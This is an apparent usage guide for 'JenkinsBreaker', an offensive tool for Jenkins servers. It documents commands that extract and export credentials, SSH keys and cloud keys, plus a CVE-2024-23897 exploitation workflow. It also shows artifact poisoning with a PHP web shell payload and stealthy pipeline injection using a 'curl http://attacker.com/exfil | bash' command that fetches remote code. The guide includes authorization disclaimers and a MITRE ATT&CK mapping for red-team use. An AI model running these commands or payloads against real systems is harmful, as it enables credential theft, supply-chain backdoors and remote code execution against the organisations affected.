# Secrets Extraction and Post-Exploitation Guide

## Overview

JenkinsBreaker now includes comprehensive secrets extraction and post-exploitation capabilities for CI/CD security assessments. These features enable red team operators to extract credentials, manipulate pipelines, and poison artifacts during authorized penetration testing engagements.

## Features

### 1. Secrets Extraction from Configuration Files

Extract secrets from Jenkins configuration files including `config.xml`, `credentials.xml`, and job configurations.

**Usage:**
```bash
python3 JenkinsBreaker.py --url http://jenkins:8080 --username admin --password admin --extract-secrets
```

**What it extracts:**
- API tokens
- Passwords
- Private keys
- Secret IDs
- Access keys
- Environment variables

**Output (redacted by default):**
```
[+] Found password in /var/jenkins_home/config.xml: test****word
[+] Found apiToken in /var/jenkins_home/credentials.xml: ghp_****1234
[+] Extracted 15 secrets from config files
```

### 2. Job Secrets Extraction

Extract secrets embedded in Jenkins job configurations and pipeline definitions.

**Usage:**
```bash
python3 JenkinsBreaker.py --url http://jenkins:8080 --username admin --password admin --extract-job-secrets
```

**What it extracts:**
- Credentials IDs from job configs
- Environment variables in pipelines
- AWS keys in build scripts
- Database passwords
- API tokens

### 3. Credential File Scanning

Scan common credential file locations within the Jenkins container.

**Usage:**
```bash
python3 JenkinsBreaker.py --url http://jenkins:8080 --username admin --password admin --scan-credential-files
```

**Scanned locations:**
- `~/.aws/credentials` (AWS credentials)
- `~/.ssh/id_rsa` (SSH private keys)
- `~/.docker/config.json` (Docker registry credentials)
- `~/.m2/settings.xml` (Maven repository credentials)
- `~/.npmrc` (NPM registry tokens)
- `~/.config/*.env` (Environment files)
- `/tmp/scripts/deploy.sh` (Deployment scripts)

**Output:**
```
[+] Found credential file: /home/jenkins/.aws/credentials
[+] Found AWS_ACCESS_KEY_ID: AKIA****MPLE
[+] Found AWS_SECRET_ACCESS_KEY: wJal****KEY
[+] Found SSH private key in /home/jenkins/.ssh/id_rsa
[+] Found NPM token: npm_****5678
[+] Scanned credential files, found 12 secrets
```

### 4. Secrets Redaction

By default, all secrets are redacted to prevent accidental exposure in terminal output or logs.

**Redaction behavior:**
- Short secrets (≤8 chars): Fully redacted (`********`)
- Long secrets: First 4 and last 4 characters shown (`AKIA****MPLE`)

**To reveal plaintext secrets:**
```bash
python3 JenkinsBreaker.py --url http://jenkins:8080 --username admin --password admin --extract-secrets --reveal-secrets
```

### 5. Secrets Export

Export all extracted secrets to a JSON file for offline analysis or reporting.

**Usage:**
```bash
# Export with redaction (default)
python3 JenkinsBreaker.py --url http://jenkins:8080 --username admin --password admin \
    --extract-secrets --scan-credential-files --export-secrets secrets.json

# Export with plaintext values
python3 JenkinsBreaker.py --url http://jenkins:8080 --username admin --password admin \
    --extract-secrets --scan-credential-files --reveal-secrets --export-secrets secrets.json
```

**JSON structure:**
```json
{
  "target": "http://jenkins:8080",
  "timestamp": "2026-01-17T01:15:00.000000",
  "secrets_count": 25,
  "secrets": [
    {
      "source": "/var/jenkins_home/.aws/credentials",
      "type": "AWS_ACCESS_KEY_ID",
      "redacted": "AKIA****MPLE"
    },
    {
      "source": "/var/jenkins_home/.ssh/id_rsa",
      "type": "SSH_PRIVATE_KEY",
      "redacted": "***SSH_PRIVATE_KEY***"
    }
  ]
}
```

### 6. Artifact Poisoning

Inject malicious payloads into build artifacts (DESTRUCTIVE - requires confirmation).

**Usage:**
```bash
python3 JenkinsBreaker.py --url http://jenkins:8080 --username admin --password admin \
    --poison-artifact test-job malicious.jar "<?php system(\$_GET['cmd']); ?>"
```

**Confirmation prompt:**
```
[!] Warning: You are about to poison build artifacts (DESTRUCTIVE). This action can be destructive.
[!] Are you sure you want to proceed? [y/N]
```

**Use cases:**
- Supply chain attack simulation
- Testing artifact integrity validation
- Demonstrating CI/CD security weaknesses

### 7. Pipeline Injection

Inject malicious code into Jenkins pipeline definitions (DESTRUCTIVE - requires confirmation).

**Usage:**
```bash
python3 JenkinsBreaker.py --url http://jenkins:8080 --username admin --password admin \
    --inject-pipeline test-pipeline "node { sh 'curl http://attacker.com/exfil | bash' }"
```

**Confirmation prompt:**
```
[!] Warning: You are about to inject malicious pipeline (DESTRUCTIVE). This action can be destructive.
[!] Are you sure you want to proceed? [y/N]
```

**What it does:**
- Modifies the pipeline script in job configuration
- Prepends malicious code to existing pipeline
- Maintains original pipeline functionality (stealth)

## Complete Workflow Example

### Scenario: Post-Exploitation After CVE Exploitation

1. **Initial exploitation** (e.g., CVE-2024-23897):
```bash
python3 JenkinsBreaker.py --url http://jenkins:8080 --exploit-cve --target-file /var/lib/jenkins/config.xml
```

2. **Extract all secrets**:
```bash
python3 JenkinsBreaker.py --url http://jenkins:8080 --username admin --password admin \
    --extract-secrets --extract-job-secrets --scan-credential-files --reveal-secrets \
    --export-secrets loot.json
```

3. **Analyze extracted secrets**:
```bash
cat loot.json | jq '.secrets[] | select(.type=="AWS_ACCESS_KEY_ID")'
```

4. **Poison artifact for persistence** (if authorized):
```bash
python3 JenkinsBreaker.py --url http://jenkins:8080 --username admin --password admin \
    --poison-artifact deploy-prod app.war "malicious-backdoor-payload"
```

5. **Generate report**:
```bash
python3 JenkinsBreaker.py --url http://jenkins:8080 --username admin --password admin \
    --save-report pentest-report.json --format json
```

## Testing Against Jenkins Lab

### Prerequisites

1. Start Jenkins Lab:
```bash
cd jenkins-lab
docker-compose up -d
```

2. Wait for Jenkins to be ready:
```bash
until curl -s http://localhost:8080 > /dev/null; do sleep 1; done
echo "Jenkins is ready"
```

### Run Test Suite

```bash
python3 test_secrets_extraction.py
```

### Manual Testing

**Test 1: Extract AWS credentials**
```bash
python3 JenkinsBreaker.py --url http://localhost:8080 --username admin --password admin \
    --scan-credential-files --reveal-secrets | grep AWS
```

Expected output:
```
[+] Found credential file: /home/jenkins/.aws/credentials
[+] Found AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE
[+] Found AWS_SECRET_ACCESS_KEY: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

**Test 2: Extract SSH keys**
```bash
python3 JenkinsBreaker.py --url http://localhost:8080 --username admin --password admin \
    --scan-credential-files | grep SSH
```

Expected output:
```
[+] Found SSH private key in /home/jenkins/.ssh/id_rsa
```

**Test 3: Export all secrets**
```bash
python3 JenkinsBreaker.py --url http://localhost:8080 --username admin --password admin \
    --extract-secrets --scan-credential-files --export-secrets jenkins_secrets.json

cat jenkins_secrets.json | jq '.secrets_count'
```

## Security Considerations

### Redaction by Default

All secrets are redacted in terminal output and logs by default to prevent:
- Accidental exposure in screenshots
- Leakage in shared terminal sessions
- Unintentional logging of sensitive data

### Destructive Operations

Artifact poisoning and pipeline injection operations:
- Require explicit confirmation (`y/N` prompt)
- Are logged in command history
- Should only be performed in authorized penetration testing

### Authorization Context

These features are designed for:
- Authorized penetration testing engagements
- Red team exercises with proper authorization
- Security research in controlled lab environments
- CTF competitions

**Unauthorized use is illegal and unethical.**

## MITRE ATT&CK Mapping

| Technique | Tactic | Description |
|-----------|--------|-------------|
| T1552.001 | Credential Access | Credentials In Files |
| T1552.004 | Credential Access | Private Keys |
| T1552.007 | Credential Access | Container API |
| T1087.001 | Discovery | Local Account Discovery |
| T1087.004 | Discovery | Cloud Account Discovery |
| T1213 | Collection | Data from Information Repositories |
| T1005 | Collection | Data from Local System |
| T1554 | Persistence | Compromise Client Software Binary |
| T1525 | Persistence | Implant Internal Image |

## Troubleshooting

### Issue: "Could not read file"

**Cause:** CVE-2024-23897 file read vulnerability may not be exploitable on this Jenkins version.

**Solution:** 
1. Verify Jenkins version is vulnerable
2. Use authenticated extraction methods
3. Check Jenkins CLI is enabled

### Issue: "Failed to poison artifact"

**Cause:** Insufficient permissions or Groovy script execution disabled.

**Solution:**
1. Verify user has Script Console access
2. Check if Script Security plugin is blocking execution
3. Ensure CSRF protection is properly handled

### Issue: "No secrets found"

**Cause:** Credentials may not be stored in expected locations.

**Solution:**
1. Use `--enumerate` to discover job structure
2. Manually inspect job configurations
3. Check for credential providers (e.g., HashiCorp Vault)

## References

- Jenkins Security Advisory: https://www.jenkins.io/security/advisories/
- OWASP CI/CD Security Risks: https://owasp.org/www-project-top-10-ci-cd-security-risks/
- MITRE ATT&CK: https://attack.mitre.org/

## Legal Disclaimer

This tooling is provided for authorized security testing only. Unauthorized access to computer systems is illegal. Always obtain written authorization before testing. The authors are not responsible for misuse.
